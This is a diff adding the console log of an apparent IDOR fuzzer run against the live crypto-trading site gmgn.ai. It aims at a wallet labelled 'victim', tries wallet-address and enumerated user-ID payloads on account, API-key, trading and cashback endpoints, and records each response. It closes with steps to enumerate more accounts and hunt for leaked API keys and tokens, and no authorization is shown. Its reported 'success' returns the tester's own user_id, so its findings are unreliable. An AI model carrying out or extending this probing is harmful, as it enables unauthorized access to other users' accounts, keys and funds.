@@ -1,0 +1,398 @@
+
+[*] Token expired - refreshing...
+✅ Got fresh token: eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnb...
+================================================================================
+🔥 UID PARAMETER INJECTION FUZZER
+================================================================================
+Goal: Find endpoint that accepts victim user_id/wallet and returns their data
+Our User ID: 00dae870-8490-4d19-bfc0-39ce49e906b5
+Our Wallet: FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8
+Victim Wallet: DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep
+================================================================================
+
+================================================================================
+PHASE 1: WALLET-BASED ENDPOINTS
+================================================================================
+
+================================================================================
+TEST: User Info by Wallet
+================================================================================
+Try to get user_info for victim wallet
+POST https://gmgn.ai/account/user_info
+
+[Attempt 1/4] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 2/4] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 3/4] Payload: {"from_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 4/4] Payload: {"sol_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+================================================================================
+TEST: Wallet List by Address
+================================================================================
+Try to get wallet info for victim address
+POST https://gmgn.ai/account/wallet/list
+
+[Attempt 1/3] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: 404 page not found
+
+[Attempt 2/3] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: 404 page not found
+
+[Attempt 3/3] Payload: {"filter": {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}}
+Status: 404
+Error response: 404 page not found
+
+================================================================================
+TEST: Trade Token by Wallet
+================================================================================
+Try to get trade_token for victim wallet
+POST https://gmgn.ai/account/trade_token
+
+[Attempt 1/2] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "secret": "any"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 2/2] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "chain": "sol"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+================================================================================
+TEST: Get Wallet Owner
+================================================================================
+Find user_id that owns this wallet
+POST https://gmgn.ai/defi/quotation/v1/wallet/owner
+
+[Attempt 1/3] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /defi/quotation/v1/wallet/owner</pre>
+</body>
+</html>
+
+
+[Attempt 2/3] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /defi/quotation/v1/wallet/owner</pre>
+</body>
+</html>
+
+
+[Attempt 3/3] Payload: {"from_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /defi/quotation/v1/wallet/owner</pre>
+</body>
+</html>
+
+
+================================================================================
+TEST: Trading Bot Wallet Info
+================================================================================
+Get trading bot info for victim wallet
+POST https://gmgn.ai/tapi/v1/trading_bot/wallet/info
+
+[Attempt 1/2] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "chain": "sol"}
+Status: 404
+Error response: 404 page not found
+
+[Attempt 2/2] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "chain": "sol"}
+Status: 404
+Error response: 404 page not found
+
+================================================================================
+PHASE 2: WALLET-TO-USER_ID DISCOVERY
+================================================================================
+
+================================================================================
+TEST: Referral Info by Wallet
+================================================================================
+Get referral info (might leak user_id)
+POST https://gmgn.ai/defi/quotation/v1/invite/get_user_invitation_info
+
+[Attempt 1/3] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /defi/quotation/v1/invite/get_user_invitation_info</pre>
+</body>
+</html>
+
+
+[Attempt 2/3] Payload: {"from_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /defi/quotation/v1/invite/get_user_invitation_info</pre>
+</body>
+</html>
+
+
+[Attempt 3/3] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /defi/quotation/v1/invite/get_user_invitation_info</pre>
+</body>
+</html>
+
+
+================================================================================
+TEST: Cashback Pending Info
+================================================================================
+Get cashback info (returns user_id for wallet)
+GET https://gmgn.ai/rebate/api/v1/cashback/pending
+
+[Attempt 1/2] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "chain": "sol"}
+Status: 200
+Response Code: 0
+✅ Success response
+Response preview: {
+  "code": 0,
+  "reason": "",
+  "message": "success",
+  "data": {
+    "user_id": "00dae870-8490-4d19-bfc0-39ce49e906b5",
+    "claim_pending": false
+  }
+}
+
+[Attempt 2/2] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "chain": "sol"}
+Status: 200
+Response Code: 0
+✅ Success response
+Response preview: {
+  "code": 0,
+  "reason": "",
+  "message": "success",
+  "data": {
+    "user_id": "00dae870-8490-4d19-bfc0-39ce49e906b5",
+    "claim_pending": false
+  }
+}
+
+================================================================================
+TEST: API Keys by Wallet
+================================================================================
+Try to get API keys for wallet owner
+GET https://gmgn.ai/api/v1/openapi/keys
+
+[Attempt 1/2] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 401
+Error response: {"code":40101612,"reason":"P_GMGN_WEB_UNAUTHORIZED","message":"param error:/api/v1/openapi/keys?wallet_address=DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep","data":null}
+
+[Attempt 2/2] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 401
+Error response: {"code":40101612,"reason":"P_GMGN_WEB_UNAUTHORIZED","message":"param error:/api/v1/openapi/keys?address=DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep","data":null}
+
+================================================================================
+TEST: Trading History by Wallet
+================================================================================
+Get trading history for victim wallet
+GET https://gmgn.ai/api/v1/trade/smart/history
+
+[Attempt 1/2] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: 404 page not found
+
+[Attempt 2/2] Payload: {"from_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: 404 page not found
+
+================================================================================
+TEST: Account Settings by Wallet
+================================================================================
+Get account settings for wallet
+POST https://gmgn.ai/account/settings/get
+
+[Attempt 1/2] Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: 404 page not found
+
+[Attempt 2/2] Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"}
+Status: 404
+Error response: 404 page not found
+
+================================================================================
+PHASE 3: USER_ID ENUMERATION
+================================================================================
+
+================================================================================
+TEST: User Info by UID (00000000)
+================================================================================
+Get user_info for user_id 00000000-0000-0000-0000-000000000001
+POST https://gmgn.ai/account/user_info
+
+[Attempt 1/3] Payload: {"user_id": "00000000-0000-0000-0000-000000000001"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 2/3] Payload: {"userId": "00000000-0000-0000-0000-000000000001"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 3/3] Payload: {"id": "00000000-0000-0000-0000-000000000001"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+================================================================================
+TEST: User Info by UID (00000000)
+================================================================================
+Get user_info for user_id 00000000-0000-0000-0000-000000000002
+POST https://gmgn.ai/account/user_info
+
+[Attempt 1/3] Payload: {"user_id": "00000000-0000-0000-0000-000000000002"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 2/3] Payload: {"userId": "00000000-0000-0000-0000-000000000002"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 3/3] Payload: {"id": "00000000-0000-0000-0000-000000000002"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+================================================================================
+TEST: User Info by UID (11111111)
+================================================================================
+Get user_info for user_id 11111111-1111-1111-1111-111111111111
+POST https://gmgn.ai/account/user_info
+
+[Attempt 1/3] Payload: {"user_id": "11111111-1111-1111-1111-111111111111"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 2/3] Payload: {"userId": "11111111-1111-1111-1111-111111111111"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 3/3] Payload: {"id": "11111111-1111-1111-1111-111111111111"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+================================================================================
+TEST: User Info by UID (00dae870)
+================================================================================
+Get user_info for user_id 00dae870-8490-4d19-bfc0-39ce49e906b5
+POST https://gmgn.ai/account/user_info
+
+[Attempt 1/3] Payload: {"user_id": "00dae870-8490-4d19-bfc0-39ce49e906b5"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 2/3] Payload: {"userId": "00dae870-8490-4d19-bfc0-39ce49e906b5"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+[Attempt 3/3] Payload: {"id": "00dae870-8490-4d19-bfc0-39ce49e906b5"}
+Status: 401
+Error response: {"code":40100012,"message":"Operation is forbidden, The app needs to be upgraded to the latest version","data":null}
+
+================================================================================
+TEST: API Keys by UID
+================================================================================
+Get API keys for user_id 00000000-0000-0000-0000-000000000001
+GET https://gmgn.ai/api/v1/openapi/keys
+
+[Attempt 1/2] Payload: {"user_id": "00000000-0000-0000-0000-000000000001"}
+Status: 401
+Error response: {"code":40101612,"reason":"P_GMGN_WEB_UNAUTHORIZED","message":"param error:/api/v1/openapi/keys?user_id=00000000-0000-0000-0000-000000000001","data":null}
+
+[Attempt 2/2] Payload: {"userId": "00000000-0000-0000-0000-000000000001"}
+Status: 401
+Error response: {"code":40101612,"reason":"P_GMGN_WEB_UNAUTHORIZED","message":"param error:/api/v1/openapi/keys?userId=00000000-0000-0000-0000-000000000001","data":null}
+
+================================================================================
+TEST: API Keys by UID
+================================================================================
+Get API keys for user_id 00000000-0000-0000-0000-000000000002
+GET https://gmgn.ai/api/v1/openapi/keys
+
+[Attempt 1/2] Payload: {"user_id": "00000000-0000-0000-0000-000000000002"}
+Status: 401
+Error response: {"code":40101612,"reason":"P_GMGN_WEB_UNAUTHORIZED","message":"param error:/api/v1/openapi/keys?user_id=00000000-0000-0000-0000-000000000002","data":null}
+
+[Attempt 2/2] Payload: {"userId": "00000000-0000-0000-0000-000000000002"}
+Status: 401
+Error response: {"code":40101612,"reason":"P_GMGN_WEB_UNAUTHORIZED","message":"param error:/api/v1/openapi/keys?userId=00000000-0000-0000-0000-000000000002","data":null}
+
+================================================================================
+PHASE 4: AUTHORIZATION HEADER MANIPULATION
+================================================================================
+
+TEST: Authorization Header with Wallet Suffix
+Status: 401
+
+TEST: Query Parameters with Wallet
+Status: 401
+
+================================================================================
+📊 RESULTS SUMMARY
+================================================================================
+
+✅ Found 2 potential IDOR vectors:
+
+1. GET https://gmgn.ai/rebate/api/v1/cashback/pending
+   Payload: {"address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "chain": "sol"}
+   Success: True
+
+2. GET https://gmgn.ai/rebate/api/v1/cashback/pending
+   Payload: {"wallet_address": "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep", "chain": "sol"}
+   Success: True
+
+
+💾 Full results saved to uid_fuzzing_results.json
+
+================================================================================
+NEXT STEPS
+================================================================================
+1. Check the results JSON for any endpoint that returned victim data
+2. If we found user_id→wallet mapping, use it to enumerate more accounts
+3. Test the working endpoint with different payloads
+4. Look for secondary IDOR in responses (API keys, tokens, etc.)
